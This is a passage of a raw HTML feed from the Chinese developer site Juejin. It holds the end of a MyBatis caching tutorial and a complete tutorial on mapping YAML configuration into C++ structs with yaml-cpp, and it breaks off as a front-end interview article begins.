<span class="hljs-comment">&lt;!-- 3. 确保实体类实现Serializable --&gt;</span>
public class User implements Serializable {
    private static final long serialVersionUID = 1L;

}
</code></pre>
<p>问题2：数据不一致</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 解决方案：及时刷新缓存 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateUser"</span> <span class="hljs-attr">flushCache</span>=<span class="hljs-string">"true"</span>&gt;</span>
    UPDATE t_user SET name = #{name} WHERE id = #{id}
<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 或设置自动刷新 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"60000"</span>/&gt;</span>
</code></pre>
<p>问题3：内存溢出</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 解决方案1：限制容量 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"512"</span>/&gt;</span>

<span class="hljs-comment">&lt;!-- 解决方案2：使用软引用 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">eviction</span>=<span class="hljs-string">"SOFT"</span>/&gt;</span>

<span class="hljs-comment">&lt;!-- 解决方案3：定时清理 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"3600000"</span>/&gt;</span>
</code></pre>
<h2 data-id="heading-33">实战案例</h2>
<p>场景：电商系统商品查询优化</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.shop.mapper.ProductMapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 
        商品信息变化不频繁，适合二级缓存
        使用LRU淘汰策略
        设置1小时自动刷新
        容量2048，覆盖热门商品
    --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">eviction</span>=<span class="hljs-string">"LRU"</span>
           <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"3600000"</span>
           <span class="hljs-attr">size</span>=<span class="hljs-string">"2048"</span>
           <span class="hljs-attr">readOnly</span>=<span class="hljs-string">"false"</span>/&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectById"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"Product"</span>&gt;</span>
        SELECT * FROM t_product WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

    <span class="hljs-comment">&lt;!--更新操作强制刷新缓存 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateProduct"</span> <span class="hljs-attr">flushCache</span>=<span class="hljs-string">"true"</span>&gt;</span>
        UPDATE t_product SET price = #{price} WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<h2 data-id="heading-34">八、总结</h2>
<pre><code class="hljs">一级缓存
✅ SqlSession级别
✅ 默认开启
✅ 增删改自动清空
✅ 适合单会话重复查询
二级缓存
✅ Mapper级别
✅ 需手动配置
✅ 跨SqlSession共享
✅ 适合读多写少场景
装饰器模式
✅ 灵活组合功能
✅ 支持多种淘汰策略
✅ 可扩展自定义实现
CacheKey机制
✅ 多元素组成
✅ 确保唯一性
✅ 精确命中判断
</code></pre>
<p>缓存是提升性能的利器，但也是一把双刃剑。理解MyBatis缓存的工作原理，才能在实战中游刃有余。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[拒绝硬编码！C++ 配置文件管理神器 yaml-cpp 实战指南]]></title>    <link>https://juejin.cn/post/7589962224795942950</link>    <guid>https://juejin.cn/post/7589962224795942950</guid>    <pubDate>2026-01-02T08:37:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795942950" data-draft-id="7590011643296661542" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="拒绝硬编码！C++ 配置文件管理神器 yaml-cpp 实战指南"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2026-01-02T08:37:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GetcharZp"/> <meta itemprop="url" content="https://juejin.cn/user/4328150938692264"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            拒绝硬编码！C++ 配置文件管理神器 yaml-cpp 实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4328150938692264/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GetcharZp
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:37:09.000Z" title="Fri Jan 02 2026 08:37:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><blockquote>
<p>还在通过修改代码来调整参数？还在手写极其脆弱的 <code>.ini</code> 解析器？是时候升级你的 C++ 配置管理方案了！本文深入解析 yaml-cpp 库，从基础功能到高级结构体映射，手把手教你搭建一套类型安全、易于维护的配置系统。附完整代码示例，即拷即用。</p>
<p>GitHub 地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjbeder%2Fyaml-cpp" target="_blank" title="https://github.com/jbeder/yaml-cpp" ref="nofollow noopener noreferrer">github.com/jbeder/yaml…</a></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3c2090ac7314fc5a83c88654197b1b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947829&amp;x-signature=cO0LGGe96lLnyFU0GME3JuB6GCI%3D" alt="image.png" loading="lazy"/></p>
<p>在 C++ 项目开发中，配置管理是一个绕不开的话题。无论是服务端程序的端口监听、数据库连接池大小，还是游戏客户端的分辨率、音量设置，我们都不希望每次调整参数都需要重新编译代码。</p>
<p><strong>YAML</strong> 以其极高的可读性和对数据结构的良好支持，成为了现代软件配置的首选格式。而在 C++ 生态中，<strong>yaml-cpp</strong> 则是处理 YAML 文件的事实标准库。</p>
<h3 data-id="heading-0">yaml-cpp 是什么？</h3>
<p><code>yaml-cpp</code> 是一个开源的 C++ 库，用于解析和生成 YAML 文档。它完全符合 YAML 1.2 规范，并且利用 C++ 的模板特性提供了类型安全的接口。</p>
<h4 data-id="heading-1">核心功能：</h4>
<ol>
<li><strong>加载 (Loading)：</strong> 将 YAML 文件解析为内存中的节点树（Node Tree）。</li>
<li><strong>发射 (Emitting)：</strong> 将内存数据序列化为 YAML 格式并保存。</li>
<li><strong>类型转换：</strong> 自动处理 int, float, string, bool, std::vector, std::map 等常见类型的转换。</li>
<li><strong>STL 兼容：</strong> 接口设计符合 C++ 标准库习惯，使用迭代器遍历序列和映射。</li>
</ol>
<h3 data-id="heading-2">优缺点与适用场景</h3>
<p><strong>优点：</strong></p>
<ul>
<li><strong>API 友好：</strong> 使用 <code>operator[]</code> 访问节点，像操作 <code>std::map</code> 一样自然。</li>
<li><strong>成熟稳定：</strong> 被广泛应用于 ROS (机器人操作系统)、各类游戏引擎及高性能服务器中。</li>
<li><strong>跨平台：</strong> 基于 CMake 构建，支持 Windows, Linux, MacOS。</li>
<li><strong>强大的自定义支持：</strong> 可以通过模板特化，直接将 YAML 节点映射为自定义 C++ 结构体。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>编译依赖：</strong> 需要集成到构建系统中。</li>
<li><strong>性能：</strong> 对于几百 MB 的巨型数据文件，解析速度不如纯 C 实现的解析器（但在配置文件场景下，性能完全不是瓶颈）。</li>
<li><strong>异常处理：</strong> 当 Key 不存在时，如果处理不当容易抛出异常，需要严谨的代码防御。</li>
</ul>
<p><strong>适用场景：</strong></p>
<ul>
<li>应用程序的启动配置文件 (<code>config.yaml</code>)。</li>
<li>游戏关卡数据、物品属性表。</li>
<li>深度学习模型的超参数配置。</li>
<li>多服务间的数据序列化交换。</li>
</ul>
<h3 data-id="heading-3">实战：像专业人士一样管理配置</h3>
<p>很多初学者使用 yaml-cpp 时，代码里充斥着 <code>config["server"]["port"].as&lt;int&gt;()</code> 这样的硬编码字符串。这种方式非常脆弱：一旦 YAML 结构变了，或者 Key 拼写错误，程序就会在运行时崩溃。</p>
<p><strong>最佳实践是：定义 C++ 结构体，并利用 <code>YAML::convert</code> 进行自动映射。</strong></p>
<p>假设我们有一个服务器项目，需要配置服务器基本信息。</p>
<h4 data-id="heading-4">1. 准备 YAML 配置文件 (<code>conf.yaml</code>)</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">service:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">vision-tool</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9605</span>
  <span class="hljs-attr">log_path:</span> <span class="hljs-string">/opt/up-zero/vision_tool/log/tool.log</span>
</code></pre>
<h4 data-id="heading-5">2. 定义 C++ 配置结构体</h4>
<p>我们在 C++ 中定义与 YAML 结构一一对应的 <code>struct</code>。</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;yaml-cpp/yaml.h&gt;</span></span>

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">AppConfig</span>
{
    std::string name;     <span class="hljs-comment">// 应用名称</span>
    <span class="hljs-type">int</span> port;             <span class="hljs-comment">// 监听端口</span>
    std::string log_path; <span class="hljs-comment">// 日志路径</span>
};
</code></pre>
<h4 data-id="heading-6">3. 实现 <code>YAML::convert</code> 特化 (核心步骤)</h4>
<p>这是 yaml-cpp 最强大的地方。我们在 <code>YAML</code> 命名空间内特化 <code>convert</code> 模板，这样就可以直接调用 <code>node.as&lt;AppConfig&gt;()</code> 了。</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-keyword">namespace</span> YAML {
    <span class="hljs-keyword">template</span>&lt;&gt;
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">convert</span>&lt;AppConfig&gt; {
        <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">decode</span><span class="hljs-params">(<span class="hljs-type">const</span> Node&amp; node, AppConfig&amp; rhs)</span> </span>{
            <span class="hljs-keyword">if</span>(!node.<span class="hljs-built_in">IsMap</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;

            <span class="hljs-comment">// 读取 service 块</span>
            <span class="hljs-keyword">if</span>(node[<span class="hljs-string">"service"</span>]) {
                <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; serviceNode = node[<span class="hljs-string">"service"</span>];
                rhs.name = serviceNode[<span class="hljs-string">"name"</span>].<span class="hljs-built_in">as</span>&lt;std::string&gt;();
                rhs.port = serviceNode[<span class="hljs-string">"port"</span>].<span class="hljs-built_in">as</span>&lt;<span class="hljs-type">int</span>&gt;();
                rhs.log_path = serviceNode[<span class="hljs-string">"log_path"</span>].<span class="hljs-built_in">as</span>&lt;std::string&gt;();
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }; 
}
</code></pre>
<h4 data-id="heading-7">4. 完整的加载与测试代码</h4>
<p>现在，我们的主逻辑代码将变得异常清爽：</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 1. 加载文件</span>
        YAML::Node config = YAML::<span class="hljs-built_in">LoadFile</span>(<span class="hljs-string">"../conf/conf.yaml"</span>);

        <span class="hljs-comment">// 2. 一键转换为 C++ 结构体</span>
        AppConfig appConfig = config.<span class="hljs-built_in">as</span>&lt;AppConfig&gt;();

        <span class="hljs-comment">// 3. 使用配置 (完全是强类型的 C++ 对象操作)</span>
        std::cout &lt;&lt; <span class="hljs-string">"--- Config Loaded ---"</span> &lt;&lt; std::endl;
        std::cout &lt;&lt; <span class="hljs-string">"Server Name: "</span> &lt;&lt; appConfig.name &lt;&lt; std::endl;
        std::cout &lt;&lt; <span class="hljs-string">"Port: "</span> &lt;&lt; appConfig.port &lt;&lt; std::endl;
        std::cout &lt;&lt; <span class="hljs-string">"Log Path: "</span> &lt;&lt; appConfig.log_path &lt;&lt; std::endl;

    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> YAML::BadFile&amp; e) {
        std::cerr &lt;&lt; <span class="hljs-string">"Error: Config file not found!"</span> &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> YAML::ParserException&amp; e) {
        std::cerr &lt;&lt; <span class="hljs-string">"Error: YAML syntax error: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> std::exception&amp; e) {
        std::cerr &lt;&lt; <span class="hljs-string">"Error: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>输出：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">---</span> <span class="hljs-string">Config</span> <span class="hljs-string">Loaded</span> <span class="hljs-string">---</span>
<span class="hljs-attr">Server Name:</span> <span class="hljs-string">vision-tool</span>
<span class="hljs-attr">Port:</span> <span class="hljs-number">9605</span>
<span class="hljs-attr">Log Path:</span> <span class="hljs-string">/opt/up-zero/vision_tool/log/tool.log</span>
</code></pre>
<h3 data-id="heading-8">为什么这么做更好？</h3>
<ol>
<li><strong>解耦 (Decoupling)：</strong> 业务逻辑代码不需要知道 YAML 的存在，它只操作 <code>AppConfig</code> 结构体。未来如果你想换成 JSON 或 XML，只需要修改转换层，业务逻辑无需变动。</li>
<li><strong>安全性 (Safety)：</strong> 所有类型转换都在加载时完成。如果 YAML 格式错误，程序会在启动时报错，而不是在运行到某一行代码时突然崩溃。</li>
<li><strong>可维护性 (Maintainability)：</strong> 增加新配置项时，只需在结构体加个字段并在 <code>convert</code> 里加一行映射，清晰明了。</li>
</ol>
<h3 data-id="heading-9">总结</h3>
<p><code>yaml-cpp</code> 不仅仅是一个解析库，配合 C++ 的类型系统，它能帮助我们构建健壮的配置管理层。在实际项目中，推荐大家尽量避免散落在代码各处的 <code>node["key"]</code> 调用，而是采用本文介绍的 <strong>Struct Mapping</strong> 模式。</p>
<p>如果你正在开启一个新的 C++ 项目，不妨试试用 yaml-cpp 来管理你的配置，体验一下结构化数据带来的掌控感！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端面试题整理(方便自己看的)]]></title>    <link>https://juejin.cn/post/7590011643296907302</link>    <guid>https://juejin.cn/post/7590011643296907302</guid>    <pubDate>2026-01-02T08:46:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643296907302" data-draft-id="7587785079737630726" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端面试题整理(方便自己看的)"/> <meta itemprop="keywords" content="前端,面试"/> <meta itemprop="datePublished" content="2026-01-02T08:46:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="就叫曲奇饼干吧"/> <meta itemprop="url" content="https://juejin.cn/user/4212984288917575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 